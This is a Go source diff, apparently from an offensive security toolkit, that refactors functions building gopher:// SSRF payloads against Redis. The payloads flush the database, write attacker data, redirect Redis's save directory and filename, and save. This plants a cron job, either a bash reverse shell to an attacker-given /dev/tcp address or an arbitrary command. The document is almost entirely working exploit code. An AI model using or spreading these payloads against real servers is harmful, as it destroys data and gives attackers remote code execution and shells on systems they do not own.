@@ -5,18 +5,15 @@ import (
 	"net/url"
 	"strings"
 
-	"github.com/virink/virzz/common"
-	"github.com/virink/virzz/utils"
+	"github.com/mozhu1024/virzz/logger"
+	"github.com/mozhu1024/virzz/utils"
 )
 
-// ExpRedisCmd -
-func ExpRedisCmd(addr, path, name, data string) (string, error) {
-	common.Logger.Debug("path: ", path)
-	common.Logger.Debug("name: ", name)
-	common.Logger.Debug("data: ", data)
+func expRedisCmd(addr, path, name, data string) (string, error) {
+	logger.Debug("path: ", path, "name: ", name, "data: ", data)
 	ps := []string{
 		"*1", "$8", "flushall",
-		"*3", "$3", "set", "$1", "1", fmt.Sprintf("$%d", len(data)), data,
+		"*3", "$3", "set", "$3", "xxx", fmt.Sprintf("$%d", len(data)), data,
 		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
 		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
 		"*1", "$4", "save",
@@ -27,12 +24,16 @@ func ExpRedisCmd(addr, path, name, data string) (string, error) {
 	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
 }
 
-// ExpRedisReverseShell -
-func ExpRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
+func expRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
 	ip, port, err := utils.ParseAddr(reverseAddr)
 	if err != nil {
 		return "", err
 	}
-	cmd := fmt.Sprintf("\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n", ip, port)
-	return ExpRedisCmd(addr, path, name, cmd)
+	cmd := fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n\n\n", ip, port)
+	return expRedisCmd(addr, path, name, cmd)
+}
+
+func expRedisCrontabFile(addr, path, name, cmd string) (string, error) {
+	cmd = fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"%s\"\n\n\n\n", cmd)
+	return expRedisCmd(addr, path, name, cmd)
 }
